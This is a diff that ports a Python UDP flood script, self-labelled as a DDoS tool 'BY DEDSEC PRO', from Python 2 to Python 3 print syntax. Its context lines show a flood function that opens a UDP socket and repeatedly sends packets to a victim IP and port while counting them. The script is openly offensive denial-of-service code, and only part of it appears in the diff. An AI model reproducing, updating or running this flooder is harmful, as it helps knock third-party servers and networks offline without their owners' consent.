@@ -5,8 +5,8 @@ import sys
 
 def usage():
     
-    print " BY DEDSEC PRO"
-    print " ip port packet"
+    print  (" BY DEDSEC PRO")
+    print  (" ip port packet")
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -21,10 +21,10 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "BY DEDSEC PRO %s DDOS %s port %s "%(sent, victim, vport)
+        print ("BY DEDSEC PRO %s DDOS %s port %s "%(sent, victim, vport))
 
 def main():
-    print len(sys.argv)
+    print (len(sys.argv))
     if len(sys.argv) != 4:
         usage()
     else:
